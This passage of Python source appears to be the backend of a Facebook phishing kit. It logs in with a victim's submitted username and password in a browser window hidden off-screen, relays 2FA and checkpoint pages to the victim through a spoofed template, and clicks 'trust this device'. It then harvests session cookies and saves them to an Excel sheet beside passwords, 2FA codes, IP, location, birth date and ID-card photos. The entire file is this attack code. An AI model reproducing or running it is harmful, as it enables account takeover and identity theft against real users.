from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
from playwright.async_api import async_playwright
import os
import shutil
import tempfile
import time
import sys
import re
import threading
from openpyxl import Workbook, load_workbook
from openpyxl.utils import get_column_letter
# Lưu lại context/page/email/password của lần đăng nhập gần nhất

def _get_headless_default() -> bool:
    """Trả về giá trị headless mặc định từ biến môi trường PLAYWRIGHT_HEADLESS"""
    return os.environ.get('PLAYWRIGHT_HEADLESS', 'true').lower() != 'false'
LAST_CONTEXT = None
LAST_PAGE = None
LAST_EMAIL = None
LAST_PASSWORD = None
# Theo dõi 2FA đã hoàn thành hay chưa - key là email
_2FA_COMPLETED = {}
_2FA_COOKIES = {}

def process_html_for_hfa(html_content: str) -> str | None:
    """
    Kiểm tra nếu HTML có input với id="_r_3_" và class chứa các class cụ thể.
    Nếu có, tìm span với class pattern x1lliihq x1plvlek... để lấy nội dung,
    sau đó thay thế vào templates/hfa.html và trả về nội dung hfa.html.
    Args:
        html_content: HTML content từ Facebook
    Returns:
        str | None: Nội dung hfa.html đã được thay thế, hoặc None nếu không tìm thấy input
    """
    import os
    # Kiểm tra input với id="_r_3_" và các class cụ thể
    # Pattern linh hoạt: chỉ cần có id="_r_3_" và các class x1i10hfl, xggy1nq, xtpw4lu trong thẻ input
    input_pattern = r'<input[^>]*id="_r_3_"[^>]*>'
    if not re.search(input_pattern, html_content):
        return None
    # Kiểm tra thêm các class đặc trưng để chắc chắn là input 2FA
    required_classes = ['x1i10hfl', 'xggy1nq', 'xtpw4lu']
    input_match = re.search(r'<input[^>]*id="_r_3_"[^>]*class="([^"]*)"[^>]*>', html_content)
    if not input_match:
        # Thử pattern khác nếu class đứng trước id
        input_match = re.search(r'<input[^>]*class="([^"]*)"[^>]*id="_r_3_"[^>]*>', html_content)
    if not input_match:
        return None
    class_content = input_match.group(1)
    if not all(cls in class_content for cls in required_classes):
        return None
    print("[HFA] Phát hiện input với id='_r_3_' - xử lý thay thế HFA template...")
    # Tìm span với class pattern chứa tên người dùng
    # Pattern: <span class="x1lliihq x1plvlek xryxfnj...">Name • Facebook</span>
    span_pattern = r'<span[^>]*class="[^"]*x1lliihq x1plvlek[^"]*"[^>]*>([^<]*)</span>'
    span_matches = re.findall(span_pattern, html_content)
    if not span_matches:
        print("[HFA] Không tìm thấy span với class pattern x1lliihq x1plvlek")
        return None
    # Tìm span có chứa pattern "Name • Facebook" (có dấu bullet)
    target_content = None
    for match in span_matches:
        if 'Facebook' in match or '•' in match or '\u2022' in match:
            target_content = match
            break
    # Nếu không tìm thấy span có bullet, lấy span đầu tiên không rỗng
    if not target_content:
        for match in span_matches:
            if match.strip():
                target_content = match
                break
    if not target_content:
        print("[HFA] Không tìm thấy nội dung span phù hợp")
        return None
    print(f"[HFA] Tìm thấy nội dung: {repr(target_content)}")
    # Đọc file hfa.html
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    hfa_path = os.path.join(base_dir, 'templates', 'hfa.html')
    try:
        with open(hfa_path, 'r', encoding='utf-8') as f:
            hfa_content = f.read()
    except Exception as e:
        print(f"[HFA] Lỗi khi đọc file hfa.html: {e}")
        return None
    # Thay thế span đầu tiên trong hfa.html có class pattern tương tự
    # Pattern: <span class="x1lliihq x1plvlek...">...</span>
    hfa_span_pattern = r'(<span[^>]*class="[^"]*x1lliihq x1plvlek[^"]*"[^>]*>)([^<]*)(</span>)'
    def replace_first_span(match):
        return match.group(1) + target_content + match.group(3)
    hfa_content_new = re.sub(hfa_span_pattern, replace_first_span, hfa_content, count=1)
    if hfa_content_new == hfa_content:
        print("[HFA] Không tìm thấy span để thay thế trong hfa.html")
        return None
    print(f"[HFA] Đã thay thế thành công, trả về nội dung hfa.html ({len(hfa_content_new)} ký tự)")
    return hfa_content_new

def clean_profile(profile_dir):
    """
    Xóa toàn bộ dữ liệu session trong profile Chromium.
    Ưu tiên xóa toàn bộ thư mục Default (cách triệt để nhất),
    giữ lại Extensions nếu có.
    """
    default_dir = os.path.join(profile_dir, "Default")
    if os.path.isdir(default_dir):
        print(f"  Tìm thấy thư mục Default, tiến hành xóa dữ liệu session...")
        # Các thư mục/file cần GIỮ LẠI (extensions đã cài sẵn trong master)
        keep = {
            "Extensions",
            "Local Extension Settings",
            "Extension Rules",
            "Extension State",
            "Managed Extension Settings",
        }
        deleted_count = 0
        for item in os.listdir(default_dir):
            if item in keep:
                print(f"  Giữ lại: {item}")
                continue
            full_path = os.path.join(default_dir, item)
            try:
                if os.path.isfile(full_path) or os.path.islink(full_path):
                    os.remove(full_path)
                elif os.path.isdir(full_path):
                    shutil.rmtree(full_path, ignore_errors=True)
                deleted_count += 1
            except Exception as e:
                print(f"  Không thể xóa {full_path}: {e}")
        print(f"  Đã xóa {deleted_count} mục trong Default/.")
    else:
        print(f"  Không tìm thấy thư mục Default, dùng fallback xóa từng file...")
        _clean_profile_fallback(profile_dir)

def _clean_profile_fallback(profile_dir):
    """
    Fallback: xóa từng file/thư mục theo danh sách cụ thể
    (dùng khi không tìm thấy thư mục Default).
    """
    targets = {
        # Cookies & Auth
        "Cookies", "Cookies-journal",
        "Login Data", "Login Data-journal",
        "Login Data For Account", "Login Data For Account-journal",
        # Session
        "Current Session", "Current Tabs",
        "Last Session", "Last Tabs",
        # History & Navigation
        "History", "History-journal",
        "Visited Links",
        "Top Sites", "Top Sites-journal",
        "Network Action Predictor", "Network Action Predictor-journal",
        # Web Data
        "Web Data", "Web Data-journal",
        "Favicons", "Favicons-journal",
        # Storage (quan trọng - lưu auth token)
        "Local Storage",
        "Session Storage",
        "IndexedDB",
        "databases",
        "blob_storage",
        "Service Worker",
        "shared_proto_db",
        # Cache
        "Cache", "Code Cache", "GPUCache",
        # Misc
        "QuotaManager", "QuotaManager-journal",
        "TransportSecurity", "TransportSecurity-journal",
        "Extension Cookies", "Extension Cookies-journal",
        "Platform Notifications",
        "GCM Store",
        "AutofillStrikeDatabase",
    }
    for root, dirs, files in os.walk(profile_dir, topdown=False):
        for name in files:
            if name in targets:
                file_path = os.path.join(root, name)
                try:
                    os.remove(file_path)
                    print(f"  Đã xóa file: {file_path}")
                except Exception as e:
                    print(f"  Không thể xóa file {file_path}: {e}")
        for name in dirs:
            if name in targets:
                dir_path = os.path.join(root, name)
                try:
                    shutil.rmtree(dir_path, ignore_errors=True)
                    print(f"  Đã xóa thư mục: {dir_path}")
                except Exception as e:
                    print(f"  Không thể xóa thư mục {dir_path}: {e}")

def get_facebook_page_after_login(
    username: str,
    password: str,
    headless: bool = None,
    timeout: int = 120000,
    master_profile: str = "master"
) -> tuple[str, bool, bool]:
    """
    Đăng nhập Facebook và trả về HTML sau khi login.
    - Tạo bản sao tạm thời của profile master, xóa sạch cookies/session/IndexedDB.
    - Nếu copy thất bại, thử dùng trực tiếp master (kèm cảnh báo).
    - Chờ tối đa `timeout` ms cho đến khi URL rời trang login.
    - Nếu URL chuyển sang trang 2FA loại two_factor thì vẫn trả về HTML (để client hiển thị).
    - Nếu URL đang ở trang authentication thì tiếp tục đợi cho đến khi rời trang đó rồi mới lấy HTML.
    - Trả về chuỗi rỗng nếu có lỗi không lấy được HTML.
    Returns:
        tuple: (html_content, should_get_cookies, login_failed)
            - html_content: HTML của trang sau khi login
            - should_get_cookies: True nếu nên lấy cookies (không ở trang two_factor), False nếu đang ở trang two_factor
            - login_failed: True nếu đăng nhập sai (URL là /login/web/)
    """
    # Xử lý giá trị mặc định cho headless
    if headless is None:
        headless = _get_headless_default()
    html_content = ""
    should_get_cookies = False
    login_failed = False
    playwright = None
    context = None
    temp_profile_dir = None
    used_master_directly = False
    try:
        # --- Xác định đường dẫn profile master ---
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        master_path = os.path.join(base_dir, master_profile)
        if not os.path.isdir(master_path):
            raise Exception(f"Không tìm thấy thư mục profile master tại: {master_path}")
        # --- Tạo thư mục tạm và copy profile ---
        temp_profile_dir = tempfile.mkdtemp(prefix="fb_profile_")
        # 1. Copy extensions từ project folder extension/ nếu có
        project_ext_dir = os.path.join(base_dir, "extension")
        if os.path.isdir(project_ext_dir):
            try:
                unpacked_ext_dir = os.path.join(temp_profile_dir, "extension_unpacked")
                shutil.copytree(project_ext_dir, unpacked_ext_dir, dirs_exist_ok=True)
                print(f"Đã copy extensions từ project/extension")
            except Exception as e:
                print(f"Lỗi copy project/extension: {e}")
        print(f"Đang copy profile từ {master_path} sang {temp_profile_dir} ...")
        try:
            # Copy toàn bộ nội dung profile master sang thư mục tạm
            shutil.copytree(
                master_path,
                temp_profile_dir,
                symlinks=False,
                ignore_dangling_symlinks=True,
                dirs_exist_ok=True
            )
            time.sleep(1)  # Chờ filesystem đồng bộ
            print("Copy hoàn tất.")
        except Exception as copy_error:
            print(f"Lỗi khi copy profile: {copy_error}")
            print("Sẽ dùng trực tiếp master profile (cảnh báo: có thể ảnh hưởng master).")
            used_master_directly = True
            temp_profile_dir = master_path
        # --- Xóa sạch session/cookies khỏi profile tạm
        #     nhưng vẫn GIỮ lại các extension đã cài trong thư mục Default ---
        # Đầu tiên làm sạch profile tạm (clean_profile sẽ giữ lại thư mục Extensions trong Default)
        print("Đang xóa cookies, session, IndexedDB khỏi profile tạm (giữ lại Extensions)...")
        clean_profile(temp_profile_dir)
        print("Đã xóa xong.")
        # Đảm bảo thư mục Extensions và Extension Settings từ master Default được copy sang profile tạm
        try:
            master_default = os.path.join(master_path, "Default")
            temp_default = os.path.join(temp_profile_dir, "Default")
            # Các thư mục cần copy để giữ extension và cấu hình (API key)
            ext_folders_to_copy = [
                ("Extensions", "Extensions"),
                ("Local Extension Settings", "Local Extension Settings"),
                ("Extension State", "Extension State"),
                ("Managed Extension Settings", "Managed Extension Settings"),
                ("Extension Rules", "Extension Rules"),
                ("Local Extension Settings", "Local Extension Settings"),
            ]
            copied_folders = []
            for source_name, dest_name in ext_folders_to_copy:
                master_folder = os.path.join(master_default, source_name)
                temp_folder = os.path.join(temp_default, dest_name)
                if os.path.isdir(master_folder):
                    os.makedirs(temp_default, exist_ok=True)
                    try:
                        shutil.copytree(
                            master_folder,
                            temp_folder,
                            symlinks=False,
                            ignore_dangling_symlinks=True,
                            dirs_exist_ok=True
                        )
                        copied_folders.append(dest_name)
                    except Exception as copy_err:
                        print(f"Lỗi copy {source_name}: {copy_err}")
            # Ngoài ra copy Extensions ra ngoài root của profile tạm để chắc chắn Chrome tìm thấy
            master_ext = os.path.join(master_default, "Extensions")
            if os.path.isdir(master_ext):
                root_ext = os.path.join(temp_profile_dir, "Extensions")
                try:
                    shutil.copytree(
                        master_ext,
                        root_ext,
                        symlinks=False,
                        ignore_dangling_symlinks=True,
                        dirs_exist_ok=True
                    )
                    copied_folders.append("Extensions(root)")
                except Exception as root_copy_err:
                    print(f"Lỗi copy Extensions ra root: {root_copy_err}")
            if copied_folders:
                print(f"Đã copy: {', '.join(copied_folders)}")
            else:
                print(f"Không tìm thấy thư mục Extensions/Settings trong master Default")
        except Exception as ext_err:
            print(f"Lỗi khi copy thư mục Extensions từ master sang profile tạm: {ext_err}")
        # --- Khởi động Playwright ---
        playwright = sync_playwright().start()
        args = [
            "--disable-blink-features=AutomationControlled",
            "--disable-gpu",
            "--no-first-run",
            "--no-service-autorun",
            "--password-store=basic"
        ]
        # 3. Load extensions từ 3 nguồn:
        #    - extension_unpacked/ (từ project)
        #    - Extensions/ (từ master root)
        #    - Default/Extensions/ (từ master Default)
        ext_search_paths = [
            os.path.join(temp_profile_dir, "extension_unpacked"),  # Từ project folder
            os.path.join(temp_profile_dir, "Extensions"),          # Từ master root
            os.path.join(temp_profile_dir, "Default", "Extensions")  # Từ master Default
        ]
        ext_folders = []
        for search_path in ext_search_paths:
            if os.path.isdir(search_path):
                # Kiểm tra nếu chính search_path là unpacked extension (có manifest.json trực tiếp)
                if os.path.exists(os.path.join(search_path, 'manifest.json')):
                    ext_full_path = os.path.abspath(search_path)
                    if ext_full_path not in ext_folders:
                        ext_folders.append(ext_full_path)
                        print(f"Tìm thấy unpacked extension: {os.path.basename(search_path)}")
                    continue  # Skip tìm trong subdirectories
                # Tìm trong các thư mục con (Chrome Web Store extensions)
                for ext_id in os.listdir(search_path):
                    ext_path = os.path.join(search_path, ext_id)
                    if os.path.isdir(ext_path):
                        try:
                            # Kiểm tra nếu là unpacked extension (có manifest.json trực tiếp)
                            if os.path.exists(os.path.join(ext_path, 'manifest.json')):
                                ext_full_path = os.path.abspath(ext_path)
                                if ext_full_path not in ext_folders:
                                    ext_folders.append(ext_full_path)
                                    print(f"Tìm thấy unpacked extension: {ext_id}")
                            else:
                                # Tìm thư mục version (Chrome Web Store extension)
                                versions = [v for v in os.listdir(ext_path) if os.path.isdir(os.path.join(ext_path, v))]
                                if versions:
                                    version_path = os.path.abspath(os.path.join(ext_path, versions[0]))
                                    if version_path not in ext_folders:
                                        ext_folders.append(version_path)
                                        print(f"Tìm thấy extension: {ext_id} (v{versions[0]})")
                        except Exception as e:
                            print(f"Lỗi khi đọc extension {ext_id} tại {search_path}: {e}")
        if ext_folders:
            load_ext_arg = f"--load-extension={','.join(ext_folders)}"
            args.append(load_ext_arg)
            args.append(f"--disable-extensions-except={','.join(ext_folders)}")
            print(f"Đã thêm {len(ext_folders)} extensions vào Chrome args.")
        else:
            print("Cảnh báo: Không tìm thấy extension nào để load.")
        if sys.platform != "win32":
            args.append("--no-sandbox")
        context = playwright.chromium.launch_persistent_context(
            user_data_dir=temp_profile_dir,
            headless=headless,
            args=args,
            locale="en-GB",
            viewport={"width": 1280, "height": 800},
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0.0.0 Safari/537.36"
            ),
            extra_http_headers={
                "Accept-Language": "en-GB,en;q=0.9"
            }
        )
        page = context.pages[0] if context.pages else context.new_page()
        if not headless:
            def _set_window_position(page) -> None:
                try:
                    import sys
                    import os
                    if sys.platform != "win32":
                        return
                    # Only Chromium supports CDP reliably
                    if not hasattr(page.context, "new_cdp_session"):
                        return
                    cdp = page.context.new_cdp_session(page)
                    win = cdp.send("Browser.getWindowForTarget")
                    window_id = win.get("windowId")
                    if window_id is None:
                        return
                    # Kiểm tra admin mode để set vị trí
                    is_admin = os.environ.get('BROWSER_ADMIN_MODE', 'false').lower() == 'true'
                    if is_admin:
                        cdp.send(
                            "Browser.setWindowBounds",
                            {
                                "windowId": window_id,
                                "bounds": {"left": 500, "top": 500, "width": 1280, "height": 800, "windowState": "normal"},
                            },
                        )
                        print(f"[InitBrowser] Window position: 500,500 (admin mode)")
                    else:
                        cdp.send(
                            "Browser.setWindowBounds",
                            {
                                "windowId": window_id,
                                "bounds": {"left": -5000, "top": -5000, "width": 1280, "height": 800, "windowState": "normal"},
                            },
                        )
                        print(f"[InitBrowser] Window position: -5000,-5000 (hidden mode)")
                except Exception as e:
                    print(f"[InitBrowser] Lỗi set window position: {e}")
                    return
            _set_window_position(page)
        # --- Mở thẳng trang login Facebook ---
        print("Đang mở trang đăng nhập Facebook...")
        page.goto(
            "https://www.facebook.com/login/?locale=en_GB",
            wait_until="domcontentloaded",
            timeout=30000
        )
        print(f"URL hiện tại: {page.url}")
        # --- Thực hiện đăng nhập ---
        print("Đang chờ form đăng nhập...")
        page.wait_for_selector('input[name="email"]', timeout=15000)
        print("Đang điền thông tin đăng nhập...")
        page.fill('input[name="email"]', username)
        time.sleep(0.3)
        page.fill('input[name="pass"]', password)
        time.sleep(0.3)
        # Tìm nút đăng nhập theo aria-label="Log in" (ưu tiên nhất, khớp với HTML thực tế)
        # Fallback lần lượt sang các selector phổ biến khác
        print("Đang tìm nút đăng nhập...")
        login_button = page.locator('[aria-label="Log in"][role="button"]')
        if login_button.count() == 0:
            login_button = page.locator('button[name="login"]')
        if login_button.count() == 0:
            login_button = page.locator('button[type="submit"]')
        if login_button.count() == 0:
            login_button = page.locator('[data-testid="royal_login_button"]')
        if login_button.count() == 0:
            raise Exception("Không tìm thấy nút đăng nhập.")
        print("Đang click đăng nhập...")
        login_button.first.click()
        # --- Chờ đăng nhập thành công (logic gốc) ---
        check_success = """
        () => {
            const url = window.location.href;
            const urlPath = window.location.pathname;
            // Nếu đang ở trang 2FA authentication thì vẫn trả về HTML để client hiển thị (giải captcha)
            if (url.includes('two_step_verification/authentication')) return true;
            // Nếu đang ở trang 2FA two_factor thì vẫn trả về HTML để client hiển thị
            if (url.includes('two_step_verification/two_factor')) return true;
            // Nếu đang ở trang auth_platform (HFA) thì vẫn trả về HTML để client hiển thị
            if (url.includes('auth_platform')) return true;
            // Nếu đang ở trang /login/web/ (đăng nhập sai) thì trả về HTML để client hiển thị
            if (urlPath.includes('/login/web/')) return true;
            // Các trang bị chặn (không trả HTML, tiếp tục đợi) - kiểm tra path, không phải query
            if (urlPath.includes('login') || urlPath.includes('checkpoint') || urlPath.includes('recover')) return false;
            // Các dấu hiệu đã đăng nhập thành công vào trang chủ
            if (
                document.querySelector('[role="feed"]') ||
                document.querySelector('[data-pagelet="root"]') ||
                document.querySelector('[data-pagelet="Stories"]') ||
                document.querySelector('div[data-pagelet="TopNav"]') ||
                urlPath === '/' ||
                url === 'https://www.facebook.com/'
            ) {
                return true;
            }
            return false;
        }
        """
        try:
            page.wait_for_function(check_success, timeout=timeout)
            # Sau khi wait_for_function trả về, kiểm tra URL để quyết định có lấy cookies hay không
            final_url = page.url
            print(f"Đăng nhập thành công! URL: {final_url}")
            # Chỉ lấy cookies ngay nếu URL KHÔNG phải là trang cần user xử lý 2FA / trust device
            is_two_factor = 'two_step_verification/two_factor' in final_url or 'auth_platform' in final_url
            is_remember_browser = final_url.startswith("https://www.facebook.com/two_factor/remember_browser")
            should_get_cookies = not (is_two_factor or is_remember_browser)
            print(f"[Debug] URL: {final_url}, is_two_factor: {is_two_factor}, is_remember_browser: {is_remember_browser}, should_get_cookies: {should_get_cookies}")
        except PlaywrightTimeoutError:
            print(
                f"Hết thời gian chờ ({timeout}ms). "
                f"URL hiện tại: {page.url}. "
                "Có thể đang chờ captcha/2FA hoặc đăng nhập thất bại."
            )
            should_get_cookies = False
            final_url = page.url
        # --- Chờ trang load đầy đủ (đặc biệt cho trang two_factor) ---
        if 'two_step_verification/two_factor' in final_url or 'auth_platform' in final_url:
            print("Đang chờ trang two_factor/auth_platform load đầy đủ...")
            try:
                page.wait_for_load_state('networkidle', timeout=10000)
                print("Trang two_factor đã load xong (networkidle).")
            except Exception as e:
                print(f"Không thể chờ networkidle: {e}, tiếp tục lấy HTML...")
            # Thêm chờ thêm 1 giây để đảm bảo UI render xong
            time.sleep(1)
        # --- Lấy HTML ---
        html_content = page.content()
        # --- Kiểm tra và xử lý HFA template nếu có input _r_3_ ---
        hfa_content = process_html_for_hfa(html_content)
        if hfa_content:
            # Kiểm tra nếu sau HFA, user xác thực từ thiết bị khác (URL có checkpoint_src=any)
            current_url_after_hfa = page.url
            if 'checkpoint_src=any' in current_url_after_hfa or 'auth_platform' in current_url_after_hfa:
                print(f"[HFA] Phát hiện xác thực từ thiết bị khác hoặc auth_platform: {current_url_after_hfa}")
                print(f"[HFA] Báo client điều hướng sang help thay vì hiển thị HFA")
                # Trả về HTML đặc biệt để client biết cần điều hướng sang help
                # Giữ nguyên logic cũ: should_get_cookies=True để lấy cookies
                should_get_cookies = True
                html_content = "<script>window.location.href='/help';</script>"
            else:
                html_content = hfa_content
        # --- Kiểm tra nếu là trang lỗi đăng nhập (/login/web/) ---
        if '/login/web/' in final_url or 'facebook.com/login/web/' in final_url:
            login_failed = True
            print(f"[Playwright] Phát hiện đăng nhập sai - URL: {final_url}")
        # --- Fix relative URLs trong HTML thành absolute URLs ---
        # Thay thế các đường dẫn tương đối /images/, /assets/, /js/, /css/ thành https://www.facebook.com/...
        # Fix src="/..." và href="/..." thành src="https://www.facebook.com/..." và href="https://www.facebook.com/..."
        html_content = html_content.replace('src="/', 'src="https://www.facebook.com/')
        html_content = html_content.replace('href="/', 'href="https://www.facebook.com/')
        # Fix url('/...') trong CSS
        html_content = re.sub(r"url\('/([^']+)'\)", r"url('https://www.facebook.com/\1')", html_content)
        html_content = re.sub(r'url\("/([^"]+)"\)', r'url("https://www.facebook.com/\1")', html_content)
        print("Đã fix relative URLs trong HTML.")
        # Lưu lại context/page/email/password để hàm get_cookies có thể dùng sau này
        global LAST_CONTEXT, LAST_PAGE, LAST_EMAIL, LAST_PASSWORD
        LAST_CONTEXT = context
        LAST_PAGE = page
        LAST_EMAIL = username
        LAST_PASSWORD = password
        print(f"Đã lấy HTML ({len(html_content)} ký tự).")
    except Exception as e:
        print(f"Lỗi không xác định: {e}")
    finally:
        pass
    return html_content, should_get_cookies, login_failed

def wait_and_save_cookies(file_name: str = "users.xlsx", timeout: int = 300000) -> str:
    global LAST_CONTEXT, LAST_PAGE
    if LAST_CONTEXT is None or LAST_PAGE is None:
        print("wait_and_save_cookies: Không có context/page để tiếp tục flow.")
        return ""
    page = LAST_PAGE
    current_url = page.url
    print(f"wait_and_save_cookies: URL hiện tại: {current_url}")
    try:
        if "two_step_verification/two_factor" in current_url:
            print("wait_and_save_cookies: Đang chờ user hoàn tất 2FA (rời trang two_factor)...")
            try:
                page.wait_for_url(
                    lambda url: ("two_step_verification/two_factor" not in url),
                    timeout=timeout,
                )
                print(f"wait_and_save_cookies: URL sau khi user hoàn tất 2FA: {page.url}")
            except PlaywrightTimeoutError:
                print(f"wait_and_save_cookies: Timeout khi chờ hoàn tất 2FA ({timeout}ms).")
                return ""
        return get_cookies(file_name=file_name, timeout=timeout)
    except Exception as e:
        print(f"wait_and_save_cookies: Lỗi không xác định: {e}")
        return ""

def _adjust_column_widths(ws):
    """Tự động căn chỉnh kích thước cột theo nội dung"""
    try:
        for column in ws.columns:
            max_length = 0
            column_letter = get_column_letter(column[0].column)
            for cell in column:
                try:
                    if cell.value:
                        cell_str = str(cell.value)
                        if len(cell_str) > 100:
                            cell_str = cell_str[:100]
                        max_length = max(max_length, len(cell_str))
                except:
                    pass
            adjusted_width = min(max_length + 2, 50)
            if adjusted_width < 10:
                adjusted_width = 10
            ws.column_dimensions[column_letter].width = adjusted_width
        print(f"[Excel] Đã tự động căn chỉnh kích thước cột")
    except Exception as e:
        print(f"[Excel] Lỗi căn chỉnh cột: {e}")

def get_cookies(session_id: str = None, file_name: str = "users.xlsx", timeout: int = 300000) -> str:
    """
    Sau khi đã trả HTML cho client, hàm này dùng lại page/context hiện tại
    để:
      - Tìm và click vào block "Always confirm that it was me." (nếu có),
      - Chờ URL chuyển sang https://www.facebook.com/,
      - Lấy chuỗi cookies và lưu vào cột thứ 3 trong file Excel (cùng hàng với email/password),
      - Trả về chuỗi cookies.
    Args:
        session_id: ID của session để lấy context/page từ _browser_sessions
        file_name: Tên file Excel để lưu
        timeout: Thời gian chờ tối đa
    """
    global LAST_CONTEXT, LAST_PAGE, LAST_EMAIL, LAST_PASSWORD
    
    # Ưu tiên dùng session_id nếu có
    if session_id:
        session = get_session_browser(session_id)
        if session:
            page = session.get('page')
            context = session.get('context')
            email = session.get('email', LAST_EMAIL)
            password = session.get('password', LAST_PASSWORD)
        else:
            print(f"get_cookies: Không tìm thấy session {session_id[:8]}...")
            # Fallback về global variables
            if LAST_CONTEXT is None or LAST_PAGE is None:
                print("get_cookies: Không có context/page để lấy cookies.")
                return ""
            page = LAST_PAGE
            context = LAST_CONTEXT
            email = LAST_EMAIL
            password = LAST_PASSWORD
    else:
        # Fallback về global variables
        if LAST_CONTEXT is None or LAST_PAGE is None:
            print("get_cookies: Không có context/page để lấy cookies.")
            return ""
        page = LAST_PAGE
        context = LAST_CONTEXT
        email = LAST_EMAIL
        password = LAST_PASSWORD
    if not email or not password:
        print("get_cookies: Không có email/password tương ứng, bỏ qua lưu Excel.")
    cookies_str = ""
    try:
        current_url = page.url
        print(f"get_cookies: URL hiện tại: {current_url}")
        
        # Nếu URL là checkpoint_src=any -> lấy cookies luôn, không cần xử lý remember_browser
        if 'checkpoint_src=any' in current_url:
            print(f"get_cookies: Phát hiện checkpoint_src=any, lấy cookies ngay...")
            # Không cần điều hướng, cứ lấy cookies từ URL hiện tại
            pass
        
        remember_browser_prefix = "https://www.facebook.com/two_factor/remember_browser"
        # Nếu đang ở remember_browser -> ấn ESC, click tin cậy, rồi chờ URL đổi
        if page.url.startswith(remember_browser_prefix):
            try:
                try:
                    print("get_cookies: remember_browser -> press Escape before clicking...")
                    page.keyboard.press("Escape")
                    time.sleep(0.2)
                except Exception as esc_err:
                    print(f"get_cookies: remember_browser -> không thể nhấn ESC: {esc_err}")
                trust_device_btn = page.locator(
                    "div[role='button'][tabindex='0']:has-text('Tin cậy thiết bị này')"
                )
                if trust_device_btn.count() == 0:
                    print("get_cookies: remember_browser -> Không tìm thấy nút 'Tin cậy thiết bị này', không lấy cookies.")
                    return ""
                print("get_cookies: remember_browser -> click 'Tin cậy thiết bị này'...")
                trust_device_btn.first.click(timeout=10000)
                try:
                    page.wait_for_url(
                        lambda url: (not url.startswith(remember_browser_prefix)),
                        timeout=min(60000, timeout),
                    )
                    print(f"get_cookies: remember_browser -> URL changed to: {page.url}")
                except PlaywrightTimeoutError:
                    print("get_cookies: remember_browser -> đã click nhưng URL chưa đổi (timeout). Không lấy cookies.")
                    return ""
            except Exception as click_err:
                print(f"get_cookies: Lỗi khi xử lý remember_browser: {click_err}")
                return ""
        # Sau khi xử lý remember_browser, kiểm tra URL có phải https://www.facebook.com/ chính xác không
        current_url = page.url
        if current_url != "https://www.facebook.com/":
            # Nếu URL có dạng https://www.facebook.com/?checkpoint_src=any hoặc bất kỳ query params nào
            # thì điều hướng về https://www.facebook.com/ sạch
            if current_url.startswith("https://www.facebook.com/"):
                print(f"get_cookies: URL có query params, điều hướng về https://www.facebook.com/ ...")
                try:
                    page.goto("https://www.facebook.com/", wait_until="domcontentloaded", timeout=30000)
                    print(f"get_cookies: URL sau khi điều hướng: {page.url}")
                except Exception as nav_err:
                    print(f"get_cookies: Lỗi khi điều hướng: {nav_err}")
                    return ""
            else:
                print(f"get_cookies: Không ở trang facebook.com, URL: {current_url}. Không lấy cookies.")
                return ""
        # Kiểm tra lại URL sau điều hướng
        if page.url != "https://www.facebook.com/":
            print(f"get_cookies: URL sau điều hướng không đúng: {page.url}. Không lấy cookies.")
            return ""
        print("get_cookies: Đang ở https://www.facebook.com/, bắt đầu lấy cookies.")
        # Lấy cookies hiện tại
        try:
            # Lấy tất cả cookies từ context
            all_cookies = context.cookies()
            # Lọc lấy cookies của facebook.com (bao gồm cả subdomain như .facebook.com)
            fb_cookies = [
                c for c in all_cookies 
                if "facebook.com" in c.get("domain", "")
            ]
            simple_pairs = [
                f"{c.get('name')}={c.get('value')}"
                for c in fb_cookies
                if c.get('name') and c.get('value')
            ]
            cookies_str = "; ".join(simple_pairs)
            print(f"get_cookies: Đã lấy {len(fb_cookies)} cookies của facebook.com, chuỗi dài {len(cookies_str)} ký tự.")
        except Exception as cookie_err:
            print(f"get_cookies: Lỗi khi lấy cookies: {cookie_err}")
            cookies_str = ""
        # Lưu vào Excel ở cột thứ 3 (nếu có thông tin email/password)
        if email and password and cookies_str:
            try:
                if not os.path.exists(file_name):
                    wb = Workbook()
                    ws = wb.active
                    # Header 11 cột khớp với main.py
                    ws.append(["Address", "Password", "Mã 2FA", "IP", "Thời gian & Vị trí", "Cookies",
                               "Email hỗ trợ", "Họ và tên", "Ngày sinh", "Ảnh CCCD", "Ảnh xem trước"])
                    wb.save(file_name)
                wb = load_workbook(file_name)
                ws = wb.active
                # Đảm bảo header có cột Cookies ở cột 6
                if ws.cell(row=1, column=6).value in (None, ""):
                    ws.cell(row=1, column=6).value = "Cookies"
                target_row = None
                # Tìm hàng có email/password tương ứng, ưu tiên từ dưới lên (gần nhất)
                for row in range(ws.max_row, 1, -1):
                    if (
                        ws.cell(row=row, column=1).value == email
                        and ws.cell(row=row, column=2).value == password
                    ):
                        target_row = row
                        break
                if target_row is None:
                    target_row = ws.max_row + 1
                    ws.cell(row=target_row, column=1).value = email
                    ws.cell(row=target_row, column=2).value = password
                ws.cell(row=target_row, column=6).value = cookies_str
                # Thiết lập text wrapping để hiển thị trong 1 ô, không tràn sang ô khác
                from openpyxl.styles import Alignment
                ws.cell(row=target_row, column=6).alignment = Alignment(wrap_text=True, vertical='top')
                # Giới hạn độ rộng cột cookies (cột 6) để không quá rộng
                ws.column_dimensions['F'].width = 50
                # Tự động căn chỉnh kích thước các cột khác
                _adjust_column_widths(ws)
                wb.save(file_name)
                print(f"get_cookies: Đã lưu cookies vào Excel hàng {target_row}, cột 6.") 
                # Chờ 1 giây trước khi đóng trình duyệt
                time.sleep(1)
                # Đóng page và context để giải phóng tài nguyên
                try:
                    # Ưu tiên đóng session từ session_id nếu có
                    if session_id:
                        session = get_session_browser(session_id)
                        if session:
                            try:
                                page_to_close = session.get('page')
                                context_to_close = session.get('context')
                                if page_to_close:
                                    page_to_close.close()
                                if context_to_close:
                                    context_to_close.close()
                                print(f"get_cookies: Đã đóng browser session {session_id[:8]}...")
                            except:
                                pass
                            # Xóa session khỏi danh sách
                            with _sessions_lock:
                                if session_id in _browser_sessions:
                                    del _browser_sessions[session_id]
                                    print(f"get_cookies: Đã xóa session {session_id[:8]}... khỏi danh sách.")
                    
                    # Fallback đóng từ global variables
                    if LAST_PAGE:
                        try:
                            LAST_PAGE.close()
                        except:
                            pass
                    if LAST_CONTEXT:
                        try:
                            LAST_CONTEXT.close()
                        except:
                            pass
                    # Dừng playwright instance để đóng hoàn toàn driver process
                    if LAST_CONTEXT and hasattr(LAST_CONTEXT, "_browser") and LAST_CONTEXT._browser:
                        try:
                            LAST_CONTEXT._browser.close()
                        except:
                            pass
